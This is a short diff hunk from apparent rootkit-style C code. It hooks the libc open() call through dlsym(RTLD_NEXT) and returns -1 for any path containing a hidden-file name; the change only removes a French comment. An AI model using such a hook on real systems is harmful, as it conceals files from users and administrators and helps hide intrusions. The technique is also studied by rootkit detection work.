@@ -49,7 +49,7 @@ int open(const char *pathname, int flags, ...) {
     if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
 
     if (strstr(pathname, HIDDEN_FILE)) {
-        return -1;  // Fichier introuvable
+        return -1;
     }
 
     return orig_open(pathname, flags);
